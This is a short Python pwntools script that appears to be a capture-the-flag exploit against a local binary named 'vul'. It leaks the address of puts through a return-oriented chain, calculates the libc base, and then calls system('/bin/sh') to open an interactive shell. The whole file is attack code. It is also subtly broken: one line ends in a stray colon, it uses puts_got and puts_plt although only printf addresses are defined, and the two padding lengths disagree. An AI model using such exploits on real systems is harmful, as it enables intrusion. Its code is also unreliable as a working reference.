from pwn import *


context.os = "linux"
context.arch = "amd64"

start = 0x4010b0
printf_got = 0x404020
printf_plt = 0x401080
pop_rdi = 0x40120b:
ret = 0x401016

payload = b'A'*22
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)

payload += p64(start)

p = process('./vul')

p.sendline(payload)
p.recvline()

leaked_puts = u64(p.recvline().strip().ljust(8,b'\00'))

#print(hex(leaked_puts))

libc_puts = 0x80ed0
offset = leaked_puts - libc_puts 

pop_rdi = offset + 0x000000000002a3e5
bin_sh = offset + 0x1d8698
system_function = offset + 0x0000000000050d60
exit_function = offset + 0x00000000000455f0

payload  = b'A'*216
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_function)
payload += p64(exit_function)

p.sendline(payload)
p.clean()
p.interactive()

